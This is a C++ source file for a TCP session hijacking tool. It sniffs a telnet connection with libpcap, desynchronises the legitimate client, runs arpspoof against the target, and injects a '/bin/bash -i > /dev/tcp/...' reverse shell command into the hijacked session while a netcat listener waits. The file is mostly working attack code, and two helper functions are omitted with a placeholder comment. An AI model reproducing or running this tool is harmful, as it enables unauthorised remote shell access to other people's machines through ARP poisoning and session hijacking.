#include <bits/stdc++.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <utility>

using namespace std;

pair<u_long, u_long> sniffPacket(u_long clientIP, u_long clientPort, u_long serverIP, u_long serverPort, char* iface)
{
    //preparing the sniffer
    int headerLength = 14;                // link-layer header length (Ethernet)
    pcap_t *handle;                      // session handle 
    char* interface;                    // interface to sniff on
    char errbuf[PCAP_ERRBUF_SIZE];     // error string 
    struct bpf_program fp;            // the compiled filter expression
    char filter_exp[] = "port 23 or port 9090";   // the filter expression (Look for telnet or reverse shell traffic) 
    bpf_u_int32 mask;               // the netmask of the sniffing device 
    bpf_u_int32 net;               // the IP of the sniffing device 

    // finding the default device to be used for sniffing
    interface = pcap_lookupdev(errbuf);
    if (interface == NULL)
    {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        exit(-1);
    }

    //storing the interface name for future use
    strncpy(iface, interface, strlen(interface));

    if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1)
    {
        fprintf(stderr, "Can't get netmask for device %s\n", interface);
        net = 0;
        mask = 0;
    }

    handle = pcap_open_live(interface,
        BUFSIZ,// portion of the packet to capture
        1,    // promiscuous mode
        -1,  // timeout value (infinite)
        errbuf);

    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
        exit(-1);
    }
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) 
    {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        exit(-1);
    }
    if (pcap_setfilter(handle, &fp) == -1) 
    {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        exit(-1);
    }

    //checking if the sniffing interface provides ethernet headers
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Interface %s doesn't provide Ethernet headers - not supported\n", interface);
        exit(-1);
    }

    printf("Waiting for traffic in the connection...\n");

    struct ip ipHeader;
    struct tcphdr tcpHeader;
    struct udphdr udpHeader;
    u_char* packet;

    //sniffing packets
    while (1) 
    {
        struct pcap_pkthdr packetHeader;
        packet = (u_char *)pcap_next(handle, &packetHeader);
        if (!packet)
            continue;

        memcpy(&ipHeader, packet + headerLength, sizeof(ipHeader));

        // checking if source and destination IP's match
        if ((ipHeader.ip_src.s_addr != clientIP) || (ipHeader.ip_dst.s_addr != serverIP))
            continue;

        if (ipHeader.ip_p == IPPROTO_TCP) 
        {
            memcpy(&tcpHeader, packet + headerLength + sizeof(ipHeader), sizeof(tcpHeader));

            // checking if source and destination port no's match
            if ((tcpHeader.th_sport != htons(clientPort)) || (tcpHeader.th_dport != htons(serverPort)))
                continue;

            // checking if the packet is part of an ongoing TCP session
            if (!(tcpHeader.th_flags & TH_ACK))
                continue;

            printf("Sniffed TCP packet! SEQ = %u ACK = %u\n", htonl(tcpHeader.th_seq), htonl(tcpHeader.th_ack));

            pair<u_long, u_long> packetInfo;
            packetInfo.first = htonl(tcpHeader.th_seq);
            packetInfo.second = htonl(tcpHeader.th_ack);

            pcap_close(handle);
            return packetInfo;
        }
        else if (ipHeader.ip_p == IPPROTO_UDP)
        {
            memcpy(&udpHeader, packet + headerLength + sizeof(ipHeader), sizeof(udpHeader));

            // checking if source and destination port no's match
            if ((udpHeader.uh_sport != htons(clientPort)) || (udpHeader.uh_dport != htons(serverPort)))
                continue;

            printf("Sniffed UDP packet! Source Port = %u Destination Port = %u\n", htons(udpHeader.uh_sport), htons(udpHeader.uh_dport));

            pair<u_long, u_long> packetInfo;
            packetInfo.first = 0; // UDP doesn't use sequence numbers
            packetInfo.second = 0; // UDP doesn't use acknowledgment numbers

            pcap_close(handle);
            return packetInfo;
        }
    }
}

// ... (unchanged code for calculateChecksum and sendPacket functions)

int main(int argc, char** argv)
{
    // sudo ./a.out 192.168.43.199 49734 192.168.43.191 23
    if (argc != 5)
    {
        printf("Usage: %s <client ip> <client port> <server ip> <server port>\n", argv[0]);
        printf("Note: Default network interface will be used for hijacking.\n");
        exit(-1);
    }
    int userID = geteuid();
    if (userID != 0)
    {
        printf("Root access required. Exiting...\n");
        exit(-1);
    }
    char buf[8192];

    u_long clientIP = inet_addr(argv[1]);
    u_long clientPort = atol(argv[2]);
    u_long serverIP = inet_addr(argv[3]);
    u_long serverPort = atol(argv[4]);

    printf("Setting up for switched environments...\n");
    system("sudo sysctl net.ipv4.ip_forward=1");

    char interface[20];
    pair<u_long, u_long> packetInfo = sniffPacket(clientIP, clientPort, serverIP, serverPort, interface);

    // opening a new terminal window for the reverse shell
    system("gnome-terminal -x bash -c 'echo \"Waiting for reverse shell to connect..\" ; nc -lv 9090 ;  exec bash'");

    memset(&buf, 0, sizeof(buf));

    // sending a big packet immediately so that the original sender can't get this connection out of sync
    sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, buf, 1024);
    packetInfo.first += 1024;

    // getting the IP address of the sniffing interface
    string ip;
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    ip = inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
    close(fd);

    // launching arpspoof attack for switched environments
    printf("Sending ARP cache poisoning packets....\n");
    string arpCommand = string("xterm -e bash -c '") + string("sudo arpspoof -i ") + string(interface) + string(" -t ") + argv[3]
        + string(" ") + argv[1] + string(" -r ; exec bash' &");
    system(arpCommand.c_str());

    sleep(5);

    // sending reverse shell command to serverPC
    string bashCommand = "\r /bin/bash -i > /dev/tcp/" + ip + "/9090 2>&1 0<&1 \r";
    int n = bashCommand.size() + 1;
    char str[n];
    strncpy(str, bashCommand.c_str(), n);
    sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, str, strlen(str));
    packetInfo.first += strlen(str);

    printf("Hijacking started.\n");
    printf("The new terminal gives you access to the targetPC using a new connection\n");
    printf("Type exit here to close the hijacked connection\n>");

    while (fgets(buf, sizeof(buf) - 1, stdin)) {
        // in case we want to send data using the hijacked connection
        // sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, buf, strlen(buf));
        // packetInfo.first += strlen(buf);
        // memset(&buf, 0, sizeof(buf));
        if (!strcmp(buf, "exit"))
        {
            printf("Closing the hijacked connection\n");
            sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, str, strlen(str));
            exit(0);
        }
        printf(">");
    }

    return 0;
}
